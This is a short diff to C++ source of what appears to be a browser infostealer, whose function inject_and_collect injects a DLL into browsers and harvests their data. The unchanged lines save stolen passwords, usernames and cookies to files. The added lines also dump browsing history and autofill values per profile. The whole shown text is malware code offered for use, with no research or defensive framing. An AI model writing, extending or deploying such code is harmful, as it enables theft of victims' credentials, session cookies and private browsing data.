@@ -536,6 +536,14 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
                 for (auto& p : p_data.passwords) pass_file << "URL: " << p.url << "\nUser: " << p.username << "\nPass: " << p.password << "\n\n";
                 pass_file.close();
 
+                std::ofstream hist_file(profile_dir / "history.txt");
+                for (auto& h : p_data.history) hist_file << "URL: " << h.url << " | Title: " << h.title << " | Visits: " << h.visit_count << "\n";
+                hist_file.close();
+
+                std::ofstream auto_file(profile_dir / "autofill.txt");
+                for (auto& a : p_data.autofill) auto_file << "Name: " << a.name << " | Value: " << a.value << "\n";
+                auto_file.close();
+
                 std::ofstream cookie_file(profile_dir / "cookies.txt");
                 json cookie_json_list = json::array();
                 for (auto& c : p_data.cookies) {
